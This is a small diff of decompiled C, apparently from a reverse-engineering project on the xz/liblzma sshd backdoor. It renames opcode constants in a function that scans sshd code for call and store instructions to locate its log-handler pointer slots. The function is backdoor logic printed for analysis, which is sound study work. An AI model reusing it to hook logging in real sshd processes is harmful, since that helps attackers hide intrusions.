@@ -34,7 +34,7 @@ BOOL sshd_validate_log_handler_slots
   u8 **bounded_func_range;
   u8 *lea_insn_ptr;
   u8 *lea_rel32_disp;
-  u32 lea_opcode_signature;
+  X86_OPCODE lea_opcode_signature;
   u64 lea_insn_size;
   
   scan_range_end = &lea_insn_ptr;
@@ -61,7 +61,7 @@ BOOL sshd_validate_log_handler_slots
         match_success = x86_decode_instruction
                           ((dasm_ctx_t *)&lea_insn_ptr,lea_rel32_disp + (long)lea_insn_ptr,
                            (u8 *)scan_range_end);
-        if ((match_success != FALSE) && (lea_opcode_signature == 0x168)) {
+        if ((match_success != FALSE) && (lea_opcode_signature == X86_OPCODE_1B_CALL_REL32)) {
           bounded_func_range = (u8 **)0x0;
           scan_range_start = lea_rel32_disp + lea_insn_size + (long)lea_insn_ptr;
           find_function_bounds
@@ -70,9 +70,11 @@ BOOL sshd_validate_log_handler_slots
           scan_range_end = bounded_func_range;
         }
         // AutoDoc: Require two independent MOV [mem],reg hits—one targeting each candidate slot—before accepting the pair.
-        match_success = find_riprel_opcode_memref_ex(scan_range_start,(u8 *)scan_range_end,(dasm_ctx_t *)0x0,0x109,addr1);
+        match_success = find_riprel_opcode_memref_ex
+                          (scan_range_start,(u8 *)scan_range_end,(dasm_ctx_t *)0x0,X86_OPCODE_1B_MOV_STORE,addr1);
         if (match_success != FALSE) {
-          match_success = find_riprel_opcode_memref_ex(scan_range_start,(u8 *)scan_range_end,(dasm_ctx_t *)0x0,0x109,addr2);
+          match_success = find_riprel_opcode_memref_ex
+                            (scan_range_start,(u8 *)scan_range_end,(dasm_ctx_t *)0x0,X86_OPCODE_1B_MOV_STORE,addr2);
           return (uint)(match_success != FALSE);
         }
       }
